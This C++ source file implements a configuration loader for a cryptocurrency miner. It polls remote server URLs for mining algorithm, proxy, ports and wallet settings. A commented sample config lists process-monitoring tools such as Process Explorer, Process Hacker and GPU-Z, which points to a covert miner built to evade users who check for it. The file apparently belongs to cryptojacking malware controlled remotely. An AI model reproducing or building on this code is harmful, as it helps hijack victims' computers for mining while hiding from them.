//
// Created by wtxpwh on 2018/11/13.
//

#include "miner_config.h"
#include <jsoncpp/json/json.h>

#include "common.h"

#include <iostream>
#include <random>

using namespace std;

miner_config::miner_config(int uid, string wid)
{
    workid = wid;
    userid = to_string(uid);
    getminercfg();
}
miner_config::~miner_config()
{

}


bool miner_config::isnewconfig()
{
    string timestampstr;
    int tsresp = 0;

    for (int i = 0; i < 10; ++i) {
        tsresp = curl.http_get(tsurl + userid, timestampstr);
        if(tsresp != 0)
            sleep(1000);
        else
            break;
    }

    if (tsresp != 0)
        return false;

    int timestampint = stoi(timestampstr);
    if (timestampint > 1529006329 && timestampint < 1830297600 && timestampint != timestamp) {
        cout << "minger config updated!" << endl;
        return true;
    }
    else
        return false;
}
/*
 {
   "C_ALGO" : "34",
   "C_NORUN" : null,
   "C_PORT" : "8008|8008",
   "C_PROXY" : "cn",
   "G_ALGO" : "75",
   "G_PORT" : "8106|8106",
   "G_PROXY" : "cn-suqa",
   "PROEXP_NAME" : "PCHunter,Process Explorer,Process Hacker,Process Monitor,cpuz.exe,GPU-Z.exe,GPUShark",
   "REFRESHFREQ" : 600,
   "REPORTFREQ" : 1800,
   "TS" : 1541597139,
   "UID" : 1,
   "id" : 10482,
   "wallet" : "game016"
}
*/

bool miner_config::getminercfg()
{

    string jsonstr;
    int cfgresp = 0;

    string postreq = "UID=" + userid + "&GPUTYPE="  + "&CUDA=";

    for (int i = 0; i < 10; ++i) {
        cfgresp = curl.http_post(cfgurl, postreq, jsonstr);
        if(cfgresp != 0)
            sleep(1000);
        else
            break;
    }

    if (cfgresp != 0)
        return false;

    Json::Reader reader;
    Json::Value root;

    if(!reader.parse(jsonstr, root, false)) {
        cout << "parse miner config file error!\n" << endl;
        return false;
    }

    cout << "get miner config ok!" << endl;
    cout << jsonstr << endl;

    timestamp = root["TS"].asInt();
    cfgrefreshfreq = root["REFRESHFREQ"].asInt();
    cfgreportfreq = root["REPORTFREQ"].asInt();
    cfgalgo = root["G_ALGO"].asString();
    cfguserid = root["UID"].asInt();
    cfggproxy = root["G_PROXY"].asString();
    cfgport = root["G_PORT"].asString();
    cfgusernameid = root["wallet"].asString();

    int pos = cfgport.find("|");
    port1 = stoi(cfgport.substr(0,pos));
    port2 = stoi(cfgport.substr(pos+1,-1));

    return  true;
}

int miner_config::getrandomport()
{
    random_device rd;
    if(rd() % 2)
        return port1;
    else
        return port2;
}

